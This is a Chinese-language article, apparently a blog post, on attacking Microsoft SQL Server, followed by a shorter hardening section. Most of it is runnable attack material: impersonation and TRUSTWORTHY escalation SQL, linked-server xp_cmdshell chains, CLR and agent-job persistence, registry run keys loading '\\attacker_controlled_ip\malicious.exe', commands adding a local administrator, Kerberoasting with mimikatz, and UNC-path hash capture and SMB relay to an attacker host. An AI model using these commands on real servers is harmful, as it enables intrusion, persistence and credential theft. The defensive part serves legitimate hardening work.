[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112719-a49403b4-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112719-a49403b4-a31a-1.png)

```
0x010500000000000515000000CAAE870FA5F89ACD856A619800020000
```

抓取完整 RID 的前 48 个字节以获取域的 SID。通过将十六进制数字值附加到先前的 SID 来创建新的 RID（将与域对象相关联）。

```
RID=0x010500000000000515000000CAAE870FA5F89ACD856A619851040000
SELECT SUSER_NAME(RID)  //获取与RID关联的域对象名称。
```

PowerUpSQL 也可盲猜域帐户。

```
Get-SQLFuzzDomainAccount -Instance ComputerNAme\InstanceName
```

#### 利用 Public 获得更多权限

在具有对 SQL Server 的 Public 权限账号的上下文中，最常用的获取执行权限的方法是：

*   特权模拟
*   存储过程和触发器创建 / 注入
*   写入存储过程的自动执行
*   SQL Server 代理任务
*   xp_cmdshell
*   创建数据库链接到文件或服务器
*   导入 / 安装自定义 CLR 程序集
*   临时查询
*   共享服务帐户
*   数据库链接
*   UNC 路径注入
*   Python/R 脚本执行。

以上大部分内容在 SQL Server 常用攻击面已经介绍，不再赘述，下面简单介绍一下前面未提的方法。

**1. 特权模拟**

SQL Server 中有一个特权 / 权限，它允许权限较低的用户，模拟行使另一个具有更多访问权限的用户。不限制执行查询 / 命令，但必须将数据库配置为允许 OS 命令执行对象。

**EXECUTE AS 语句**

默认情况下，会话在用户登录时开始，并在用户注销时结束。会话期间的所有操作都必须对该用户进行权限检查。当一个 **EXECUTE AS** 语句运行，会话的执行上下文切换到指定的登录名或用户名。上下文切换之后，将针对该帐户的登录名和用户安全性令牌而不是调用 **EXECUTE AS** 语句的人员检查权限。本质上，在会话或模块执行期间将模拟用户或登录帐户，或者显式还原上下文切换。

使用 public 角色用户 testuser，手动检查是否是 sa 登录：

```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin') //检查SQL Server 登录名是否为指定服务器角色的成员。
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112732-acb0f124-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112732-acb0f124-a31a-1.png)

```
EXECUTE AS LOGIN = 'sa'  //模拟sa数据库级别，对于服务器级别，请使用EXECUTE AS USER。
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112746-b51ea126-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112746-b51ea126-a31a-1.png)

再次使用 public 角色用户 testuser，手动检查目前模拟为 sa 登录：

```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112813-c4db4dc6-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112813-c4db4dc6-a31a-1.png)

**2. 存储过程和触发器创建 / 注入**

开发人员的一个常见错误是将他们要使用的所有功能，将其写入存储过程中，以便能够在其他用户的上下文中执行。这些存储过程可以作为数据库的所有者（拥有所有者的 EXECUTE AS）来执行，以使它可以访问其他资源。也可以在高权限用户的上下文中进行执行，并且不需要授予特权。但是，从安全的角度来看，采用此方法有一些缺点：

*   无法精细控制数据库所有者的权限。
*   普通帐户或 sysadmin 帐户通常拥有数据库。

DB_OWNER 角色可以使用 EXECUTE AS OWNER 在 sa 或 sysadmin 帐户的上下文中执行。如果这些存储过程实现不安全，则可以通过扩展存储过程来通过 SQL 注入或命令注入进行模拟。例子：

```
USE test2
GO
CREATE PROCEDURE test_imitation2
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'testuser','sysadmin'
GO
```

必须将数据库配置为值得信赖的 OS 命令执行程序。虽然可以通过 SQL 或命令注入进行模拟，但是创建存储过程或触发器是更好的选择。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112759-bc9c6cf8-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112759-bc9c6cf8-a31a-1.png)

攻击场景：

DBA 对 Web 应用程序执行以下操作：

```
CREATE LOGIN somebody WITH PASSWORD = 'Password123';  //为WebApp创建SQL登录名。
USE test
ALTER LOGIN [somebody] with default database = [test];
CREATE USER somebody FROM LOGIN [somebody];
EXEC sp_addrolemember [db_owner], [somebody];  //为此SQL登录名分配db_owner角色。Webapp可以从数据库访问所需的任何内容。
ALTER DATABASE CurrentDB SET TRUSTWORTHY ON  //将数据库设置为可信任的访问外部资源。
```

可以在查询中识别此类数据库

```
SELECT SUSER_NAME(owner_id) as DBOWNER, d.name as DATABASENAME FROM sys.server_principals r INNER JOIN sys.server_role_members m on r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112826-cca49fee-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112826-cca49fee-a31a-1.png)

可以使用以下 metasploit 模块自动进行探测

```
auxiliary/admin/mssql/mssql_escalate_dbowner
auxiliary/admin/mssql/mssql_escalate_dbowner_sqi
```

[更多方法可参考 NetSpi 博客](https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/)

**3. 服务帐户**

SQL Server 所有版本都为服务帐户提供 sysadmin 特权。

列出常见的一些服务帐户类型：

*   域用户
*   本地用户
*   本地系统
*   网络服务
*   本地托管服务帐户
*   域托管服务帐户

PowerUpSQL 的 Invoke-SQLOSCMD 可用于基本命令执行。

对于单个主机实例：

```
Invoke-SQLOSCMD –Verbose –Instance "server1\instance1" –Command "whoami"
```

对于域内实例：

```
Get-SQLInstanceDomain | InvokeSQLOSCMD –Verbose –Command "whoami"
```

如果我们攻击了一个 SQL Server，那么我们也将使用该共享帐户来攻击所有 SQL Server。

**4. 爬数据库链接**

数据库链接（Database Link）本质上是两个服务器之间的持久连接。数据库链接（Database Link）的作用是，允许一个数据库服务器去对其他的数据库服务器进行查询。数据链接可以用不同的方式进行配置，但是更多时候我们看到它们使用硬编码的凭据。

Public 角色使用 openquery() 函数，对被链接的数据库服务器进行查询；也可以执行 xp_cmdshell，对远程访问也无凭证要求。通常配置此功能会使数据库服务器，拥有过多的特权。因此允许在远程服务器上的模拟登录，切换到高权限账号的上下文中。

下图简单说明当数据库对链接查询功能配置过高特权时，注入的 payload 是如何被传递：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112840-d56810c0-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112840-d56810c0-a31a-1.png)

列出所有链接的服务器名，通常有两个选项

```
exec sp_linkedservers
```

和

```
SELECT srvname FROM master..syservers
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112918-ebdba63c-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112918-ebdba63c-a31a-1.png)

查询一个服务器的所有链接的服务器名：

```
SELECT srvnaem From openquery(DB1, 'select srvname FROM master..sysservers')
```

查询一个服务器的某个链接的服务器所链接的服务器名：

```
SELECT srvnaem From openquery(DB1, 'select srvname FROM openquery(HVA, "SELECT srvname FROM master..syservers")')
```

查询可以一直嵌套执行，直到穷尽所有数据库服务器。在链接的服务器上执行命令：

```
SELECT * FROM openquery(DB1, 'SELECT * FROM openquery(HVA, "SELECT 1; exec xp_cmdshell'"'ping 192.168.1.1"" '')')
```

SQL Server 2005 存在链接爬网命令执行漏洞，使用 msf 的 mssql_linkcrawler 模块可获得反弹 shell。

```
use exploit/windows/mssql/mssql_linkcrawler
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112855-ddf02b88-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112855-ddf02b88-a31a-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112907-e4ef73b2-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112907-e4ef73b2-a31a-1.png)

自动化爬网的工具：

*   [mssql_linkcrawler](https://www.rapid7.com/db/modules/exploit/windows/mssql/mssql_linkcrawler)
*   [PowerUpSQL](https://blog.netspi.com/sql-server-link-crawling-powerupsql/)
*   ……

#### 从系统管理员到 Sysadmin

首先先了解三个点：

*   SQL Server 较旧的版本为本地管理员提供 sysadmin 特权
*   SQL Server 较旧的版本为本地系统提供 sysadmin 特权
*   SQL Server 所有版本都为 SQL Server 服务帐户提供 sysadmin 特权

以下是利用点和常用工具列表：

<table><thead><tr><th>利用点</th><th>常用工具</th></tr></thead><tbody><tr><td>本地管理员身份访问 DB</td><td>Management Studio，sqlcmd 和其他 SQL 客户端工具。</td></tr><tr><td>本地系统身份访问 DB</td><td>Psexec，可访问性选项，带有本机 SQL 客户端工具的调试器。</td></tr><tr><td>通过 LSA Secrets 恢复服务帐户密码</td><td>Mimikatz, Metasploit, lsadump.</td></tr><tr><td>SQL Server 服务进程注入</td><td>Metasploit, Python, Powershell （LoadLibrary，CreateRemoteThread 等类似的功能）</td></tr><tr><td>从服务进程中窃取身份验证令牌</td><td>Metasploit, Incognito, Invoke-TokenManipulation</td></tr><tr><td>单用户模式</td><td>DBATools</td></tr></tbody></table>

以上利用点不一定适用所有 SQL Server 所有版本，下面简单列出一下适用版本（√：适用，×：不适用，?：可能适用），仅供参考：

<table><thead><tr><th>利用点</th><th>SQL Server 2000</th><th>SQL Server 2005</th><th>SQL Server 2008</th><th>SQL Server 2012</th><th>SQL Server 2014</th><th>SQL Server 2016</th></tr></thead><tbody><tr><td>服务凭证</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>本地管理员</td><td>√</td><td>√</td><td>×</td><td>×</td><td>×</td><td>×</td></tr><tr><td>本地系统</td><td>√</td><td>√</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>SQL Server 进程注入</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>?</td></tr><tr><td>令牌窃取</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>?</td></tr><tr><td>单用户模式</td><td>?</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table>

附 PowerUpSQL 一些执行命令：

<table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>SQL Server 帐户的域用户。 以域用户身份运行时，此功能将自动执行 4 件事。1. 通过 LDAP 查询到 DC 的 SPN 来识别域上的 SQL Server。2. 尝试登录每个。3. 使用多种方法执行 UNC 路径注入。4. 尝试捕获关联的 SQL Server 服务帐户的密码哈希。</td><td>Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12</td></tr><tr><td>通过服务帐户模拟将 OS 管理员转换为 sysadmin，然后所有 PowerUpSQL 命令都可以以 sysadmin 身份运行。</td><td>Invoke-SQLImpersonateService -Verbose -Instance MSSQLSRV04\BOSCHSQL</td></tr><tr><td>审核问题</td><td>Invoke-SQLAudit -Verbose -Instance SQLServer1</td></tr><tr><td>升级到 sysadmin</td><td>Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1</td></tr><tr><td>执行 OS 命令：xp_cmdshell</td><td>$Targets \</td><td>Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10</td></tr><tr><td>执行 OS 命令：自定义扩展存储过程</td><td>Create-SQLFileXpDll -OutFile c:\temp\test.dll -Command "echo test &gt; c:\temp\test.txt" -ExportName xp_test -Verbose<code>将test.dll放在在SQL Server服务帐户可读的共享上。</code>Get-SQLQuery -Verbose -Query "sp_addextendedproc'xp_test','\yourserver\yourshare\myxp.dll'"<code>`xp_test</code> `sp_dropextendedproc 'xp_test'</td></tr><tr><td>执行 OS 命令：CLR</td><td>$Targets \</td><td>Invoke-SQLOSCLR -Verbose -Command "Whoami"</td></tr><tr><td>执行 OS 命令：Ole 自动化过程</td><td>$Targets \</td><td>Invoke-SQLOSOle -Verbose -Command "Whoami"</td></tr><tr><td>执行 OS 命令：外部脚本 - R</td><td>$Targets \</td><td>Invoke-SQLOSR -Verbose -Command "Whoami"</td></tr><tr><td>执行 OS 命令：外部脚本 - Python</td><td>$Targets \</td><td>Invoke-SQLOSPython -Verbose -Command "Whoami"</td></tr><tr><td>执行 OS 命令：代理作业 - CmdExec</td><td>$Targets \</td><td>Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello &gt; c:\windows\temp\test1.txt"</td></tr><tr><td>执行 OS 命令：代理作业 - PowerShell</td><td>$Targets \</td><td>Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output"hello world" \</td><td>out-file c:\windows\temp\test2.txt' -Sleep 20</td></tr><tr><td>执行 OS 命令：代理作业 - VBScript</td><td>$Targets \</td><td>Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\windows\system32\cmd.exe /c echo hello &gt; c:\windows\temp\test3.txt'</td></tr><tr><td>执行 OS 命令：代理作业 - JScript</td><td>$Targets \</td><td>Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\windows\system32\cmd.exe /c echo hello &gt; c:\windows\temp\test3.txt'</td></tr><tr><td>检索数据库链接</td><td>Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1</td></tr><tr><td>检索数据库链接并执行查询</td><td>Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1 -Query "select name from master..sysdatabases"</td></tr><tr><td>抓取数据库链接并执行 OS 命令</td><td>Get-SQLCrawl -instance "SQLSERVER1\Instance1" -Query "exec master..xp_cmdshell'whoami'"</td></tr><tr><td>转储代理任务的内容。通常包含密码。详细输出包括作业摘要数据。</td><td>$Results = Get-SQLAgentJob -Verbose -Instance Server1\Instance1 -Username sa -Password '123qweASD'</td></tr><tr><td>枚举所有 SQL 登录名作为最低特权用户，并测试用户名作为密码。</td><td>针对单个服务器 Invoke-SQLAuditWeakLoginPw -Verbose -Instance SQLServer1\Instance1 运行针对域 SQL Server 运行 $WeakPasswords = Get-SQLInstanceDomain -Verbose \</td><td>Invoke-SQLAuditWeakLoginPw -Verbose<code></code>$WeakPasswords</td></tr></tbody></table>

### SQL Server 权限维持

利用 SQL Server 设置权限维持方法，主要还是靠 SQL Server 代理作业，定期执行计划任务。为了实现无文件攻击，还利用 CLR 程序集功能，加载恶意 DLL 文件。通过这两种内置功能进行持久化，实现了在无文件落地、无其他进程的情况下，实施权限维持。

此持久化有几个前提条件：

*   启动 SQL Server 代理服务
*   开启 CLR 功能
*   将存储. Net 程序集的数据库配置为可信赖的

以上均在 SQL Server 代理执行计划任务和 SQL Server CLR 相关利用详细介绍。

#### 高隐蔽性持久化

连接 SQL Server 数据库后，创建 SQL Server 代理作业，定时执行 SQL 语句调用恶意的用户自定义存储过程或函数利用 SQL 语句将 CLR 程序集以十六进制形式加载加载进数据库，实现通过用户自定义函数调用恶意的 CLR 程序集。已创建的 SQL Server 代理作业，定期执行计划任务，调用 CLR 程序集，实现无文件持久化。

首先创建名为 CreateWarSQLKit 的存储过程（**WarSQLKit** 相关的利用可查看第二章中 SQL ServerCLR 相关利用的 **WarSQLKit** 篇章）

```
USE msdb;
CREATE procedure CreateWarSQLKit as
    CREATE ASSEMBLY [WarSQLKit]
    AUTHORIZATION [dbo]
    FROM 0x4D5A......
    WITH PERMISSION_SET = UNSAFE;
GO
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113004-06f2c32e-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113004-06f2c32e-a31b-1.png)

创建 SQL Server 代理作业，定期执行 CreateWarSQLKit，实现 WarSQLKit 的 DLL 文件持久化。

```
USE msdb;
EXEC dbo.sp_add_job @job_name = N'test_CreateWarSQLKit_job1'; 
EXEC sp_add_jobstep 
    @job_name = N'test_CreateWarSQLKit_job1', 
    @step_name = N'test_CreateWarSQLKit_name1',
    @subsystem = N'TSQL',
    @command = N'exec CreateWarSQLKit', 
    @retry_attempts = 5, 
    @retry_interval = 5 ;
EXEC dbo.sp_add_jobserver @job_name = N'test_CreateWarSQLKit_job1';
EXEC dbo.sp_start_job N'test_CreateWarSQLKit_job1';
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113215-550e0564-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113215-550e0564-a31b-1.png)

#### 其他方式实现持久化

除了正常利用 SQL Server 可以执行系统命令的存储过程，以下操作都是作为 SQL 对象存储在数据库中，并且没有任何更改到磁盘，也可以做到无文件持久化。

可以为 utilman.exe 设置调试器，该调试器将在调用 cmd.exe 时运行。仅 sysadmins 特权。

```
import-module .\PowerUPSQL.psd1
Get-SQLPersistentRegDebugger -Verbose -FileName utilman.exe -Command 'c:\windows\system32\cmd.exe' -Instance SQLServerName\InstanceName'
```

可以利用 CurrentVersion \run 与 xp_regwrite 建立。仅 sysadmins 特权。

```
import-module .\PowerUPSQL.psd1
Get-SQLPersistentRegRun -Verbose -Name legit -Command '\\attacker_controlled_ip\malicious.exe' -Instance 'SQLServerName\InstanceName'
```

可以将所有自定义 CLR 程序集导出到 DLL，最后导入后门 CLR。仅 sysadmins 特权。

```
import-module .\PowerUPSQL.psd1
$Results = Get-SQLStoredProcedureCLR -Verbose -Instance 'SQLServerName\InstanceName' -UserName sa -Password 'password' -ExportFolder c:\temp
Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.exe
```

如果遇到 SQLServer 中的 xplog70.dll 文件被删除或放到其他地方了， xp_cmdshell 就无法执行我们发出的命令了。可以考虑 SQLServer 中有一系列与 OLE 相关的存储过程，这一系列的存储过程同 xp_cmdshell 以及读取注册表系列的存储过程一样危险，所以被删除的可能性就小一些。这系列的存储过程有 sp_OACreate，sp_OADestroy，sp_OAGetErrorInfo，sp_OAGetProperty，sp_OAMethod，sp_OASetProperty，sp_OAStop。

可以在系统添加一个用户名为 test，密码为 12345678，并加入管理员组。

```
DECLARE @shell INT EXEC SP_OACREATE 'wscript.shell',@shell OUTPUT EXEC  SP_OAMETHOD @shell,'run',null, 'c:\windows\system32\cmd.exe /c net user test  12345678 /add'

DECLARE @shell INT EXEC SP_OACREATE 'wscript.shell',@shell OUTPUT  EXEC SP_OAMETHOD @shell,'run',null, 'c:\windows\system32\cmd.exe /c net  localgroup administrators test /add '
```

xp_cmdshell、SP_OACREATE 等可执行系统命令的存储过程，以及与它们相对应的动态连接库文件（DLL）都被删除了，还可以读取和修改注册表的存储过程（xp_regread、xp_regwrite）来克隆对方系统的管理员用户。

PowerUpSQL 命令参考：

<table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>将所有自定义 CLR 程序集导出到 DLL。它们可以脱机反编译，并且通常包含密码。而且，无需过多努力即可将其借壳。</td><td><code>$Results = Get-SQLStoredProcedureCLR -Verbose -Instance Server1\Instance1 -Username sa -Password 'P@ssword!' -ExportFolder c:\temp</code> `$Results</td><td>Out-GridView`</td></tr><tr><td>创建一个可用于导入现有（或后门）CLR 程序集的 SQL 命令。</td><td><code>Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.dll</code> 博客：<a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/" target="_blank">https://blog.netspi.com/attacking-sql-server-clr-assemblies/)://blog.netspi.com/attacking-sql-server-clr-assemblies/</a></td></tr><tr><td>创建可用于导入 CLR 程序集以执行 OS 命令的 DLL 和 SQL 命令。</td><td><code>Create-SQLFileCLRDll -Verbose -ProcedureName runcmd -OutDir c:\temp -OutFile evil</code></td></tr><tr><td>获取共享 SQL Server 服务帐户的列表。</td><td>`Get-SQLInstanceDomain -Verbose</td><td>Select-Object DomainAccount, ComputerName -Unique</td><td>Group-Object DomainAccount</td><td>Sort-Object Count -Descending` 注意：任何大于 1 的计数都表示在多个系统上使用的域帐户可能会被用于 SMB 中继攻击。</td></tr></tbody></table>

### SQL Server 横向移动

#### Kerberoast 攻击

利用传统的 Kerberoast 攻击方式进行横向移动，Kerberoast 是一种针对 Kerberos 协议的攻击方式。根据 Kerberos 协议，当向活动目录完成身份验证后，密钥分发中心（KDC）会将服务授权的票据（TGT）发送给用户，作为访问资源时的身份凭证。当需要访问资源，向票据服务器（TGS）发送 Kerberos 票据时，首先需要使用具有有效身份用户的票据（TGT）向票据服务器（TGS）请求乡音的服务票据。当该票据（TGT）被验证具有此服务的权限是，会向用户发送一张新的票据。新的票据使用 SPN 关联的计算机中的服务账号的 NTLM Hash。攻击者可以尝试不同的 NTLM Hash 来开启 Kerberos 票据。NTLM Hash 对应的是服务账号的密码。

实施此攻击前有几个前提条件：

*   域内用户运行的 SQL Server 已经手动注册过 SPN
*   Kerberos 协议加密方式为 RC4_HMAC_MD5

通过 SQL Server 能执行 PowerShell 命令的利用点和导入特定功能的 CLR 程序集即可完成 Kerberoast 攻击。

查看指定域内用户所注册的 SPN

```
setspn -L SEC\MSSQL2
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113633-ef0daeda-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113633-ef0daeda-a31b-1.png)

通过上文设置 WarSQLKit 的 DLL 存在 sp_Mimikatz 存储，执行 mimikatz。

```
exec sp_cmdExec 'sp_Mimikatz';
select * from WarSQLKitTemp //获取Mimikatz日志
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113648-f84765f4-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113648-f84765f4-a31b-1.png)

或者利用任何一种可以执行 PowerShell 命令的方式，可以请求到 SPN 的 Kerberos 票据：

```
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/MSSQL2.sec.com:1433"
exec xp_cmdshell 'powershell Add-Type -AssemblyName System.IdentityModel ; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/MSSQL2.sec.com:1433"'
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113704-0189a30c-a31c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113704-0189a30c-a31c-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113721-0bee9708-a31c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113721-0bee9708-a31c-1.png)

之后可以使用 PowerShell 命令远程下载部署 [mimikatz](https://github.com/gentilkiwi/mimikatz)，或者 [kerberoast](https://github.com/nidem/kerberoast)。

```
#mimikatz：kerberos::list /export
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113734-136c4930-a31c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113734-136c4930-a31c-1.png)

导出的票据会保存到当前目录的 kirbi 文件。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113749-1c5d0f8e-a31c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113749-1c5d0f8e-a31c-1.png)

利用 [kerberoast](https://github.com/nidem/kerberoast) 中的 tgsrepcrack.py 脚本，离线破解 NTLM Hash。

PowerUpSQL 中使用 Get-SQLServerPasswordHash，可自动提取 SQL 登录密码哈希：

```
import-module .\PowerUPSQL.psd1
Get-SQLServerPasswordHash -Verbose -Instance 'SQLServerName\InstanceName' -Migrate
```

#### CLR 实现无文件落地横向移动

[David Cash](https://research.nccgroup.com/author/dcashncc/) 在 [MSSQL Lateral Movement](https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/) 介绍了 SQL Server 中使用 CLR 自动执行横向移动而无文件落地和不需要 xp_cmdshell，以及如何防止被检测到。

CLR 相关的介绍在上文已经介绍，在此不再赘述。通常为实现命令执行而对 MSSQL 服务进行后期开发通常会利用 XP_CMDSHELL 存储过程在 MSSQL 进程的上下文中运行操作系统命令。要使用此技术运行自定义代码，通常需要使用 LOLBINS，添加新的操作系统用户或通过 BCP 写入磁盘的二进制文件，这提供了明显的检测机会。

SQL Server 服务进程可以执行提供给它的任何. NET 代码，因此利用. NET 代码进行横向移动，仅需要构建适当的 DLL。作为概念的证明，为了生成了一个简单的程序集，该程序集对一些 shellcode 进行 XOR 并将其注入到生成的进程中。使用 [Squeak](https://github.com/nccgroup/nccfsas/tree/main/Tools/Squeak) 可以简化 CLR 代码的创建和调用，下面是 Squeak 具备的一些功能：

*   展示连接数据
    
*   从原始二进制文件和单字节 XOR 读取 shellcode 字节
    
*   生成一个 MSSQL CLR DLL，该 DLL 对 shellcode 进行 XOR，生成一个新进程，然后将 shellcode 注入其中。
    
*   计算 DLL 的 SHA512 哈希
    
*   生成带有硬编码参数的单个. NET 可执行文件，以通过 SQL 连接执行 DLL –该可执行文件执行以下操作：
    
    *   创建一个 SQL 连接
        
    *   检查 SQL Server 版本
        
    *   检查 DBA 权限
        
    *   检查并记录现有的安全设置
        
    *   修改安全设置
        
    *   创建并运行程序集
        
    *   恢复安全设置并删除程序集
        

使用 [Squeak](https://github.com/nccgroup/nccfsas/tree/main/Tools/Squeak) 可以生成带有连接字符串和 CLR 程序集的独立可执行文件。CLR 程序集的代码是从本地目录中的文件中加载，可以直接打开文件，也可以在工具中对其进行编辑。

#### UNC 路径注入

UNC 用于访问远程文件服务器，格式为 \ ip\file，如果我们可以执行这个功能，则可以强制 SQL Server 向我们进行身份验证，并且可以获得 SQL Server 服务帐号的 NTLM 密码哈希。

**可以通过以下方式实现自动化：**

*   PowerUpSQL 的 Get-SQLServiceAccountPwHashes 脚本
*   SQL NTLM Hash：

```
import-module .\PowerUpSQL.ps1`
Import-Module C:\PowerUpSQL-master\Scripts\3rdparty\Inveigh.ps1
Import-Module C:\PowerUpSQL-master\Scripts\pending\Get-SQLServiceAccountPwHashes.ps1
Get-SQLServiceAccountPwHashes -Verbose -TimeOut 20 -CaptureIp attacker_controlled_ip
```

*   使用 smbrelayx（impacket）

```
python smbrelayx.py -h sqlserverIP -c 'powershell empire launcher'
```

*   metasploit 的 SQL NTLM Hash：

```
msf > use auxiliary/admin/mssql/mssql_ntlm_stealer
set SMBPROXY attackerIP
set RHOST webappwithsqliIP
set GET_PATH pathtosqli
run
```

**防守方如何应对**
-----------

### 账号管理

**查询目前所有用户列表**

```
select name,password from syslogins order by name
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111027-49d81cd2-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111027-49d81cd2-a318-1.png)

**为不同的管理员分配不同的账号**

按照使用目的进行分配账号，避免不同用户间共享账号，提高安全性。或在企业管理器中直接添加远程登陆用户建立角色，并给角色授权，把角色赋给不同的用户或修改用户属性中的角色和权限。

添加不同用户，参考配置操作：

```
sp_addlogin 'user1','password1'
sp_addlogin 'user2','password2'
```

**删除或锁定无效账号**

删除冗余的系统默认账号，减少系统安全隐患，参考配置操作。

```
Microsoft SQL Server Management Studio -> SQL Server -> 安全性 -> 登录名 -> 选择要删除的用户名（右键）
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111051-57d84c1c-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111051-57d84c1c-a318-1.png)

**限制启动账号权限**

启动 mssql 的用户权限过高，会导致其子进程具有相同权限，参考配置操作：

```
Microsoft SQL Server Management Studio -> SQL Server ->属性(右键) -> 安全性
```

新建 SQL server 服务账号后，建议将其从 User 组中删除，且不要把该账号提升为 Administrators 组的成员，授予以账户最少启动权限。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111106-60d29eb2-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111106-60d29eb2-a318-1.png)

### 认证授权

**权限最小化**

在数据库权限配置能力内，根据用户的业务需要，配置其所需的最小权限，参考配置操作：

```
Microsoft SQL Server Management Studio -> SQL Server -> 属性(右键) -> 安全性
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111118-6804c070-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111118-6804c070-a318-1.png)

**数据库角色**

使用数据库角色（ROLE）来管理对象的权限，参考配置操作：

```
Microsoft SQL Server Management Studio -> SQL Server -> 安全性 -> 服务器角色（右键）-> 新服务器角色
```

调整角色属性中的权限，赋予角色中拥有对象对应的 SELECT、INSERT、UPDATE、DELETE、EXEC、DRI 权限

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111136-72b543fa-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111136-72b543fa-a318-1.png)

**是否存在空密码用户**

对所有账户的属性进行审计，包括空密码、密码更新时间等。修改目前所有账号的口令，确认为强口令。特别是 sa 账号。

```
select * from sysusers 
select name,Password from syslogins where password is null order by name  # 查看口令为空的用户
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111148-7a02ed06-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111148-7a02ed06-a318-1.png)

使用 sp_password 更新用户密码，特别是 sa 账号，需要设置至少 10 位的强口令。

```
exec sp_password 'old_passwd', 'new_passwd', sa
```

**锁定特权**

默认情况下，SQL Server 安装会在模型数据库之外的所有数据库中授予 guest 帐户公共角色成员身份。 建议在 Windows 中禁用 guest 帐户，并撤消其对除 master 和 tempdb 之外的所有数据库的访问权限。参考配置操作，使用以下命令删除数据库访问权限

```
use msdb;
exec sp_revokedbaccess guest;
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111202-8238066e-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111202-8238066e-a318-1.png)

Public 不应访问 Web 任务表，因为它们可以使表数据可供 Web 客户端使用。 特权应被撤销：

```
revoke update on mswebtasks to public
revoke insert on mswebtasks to public
```

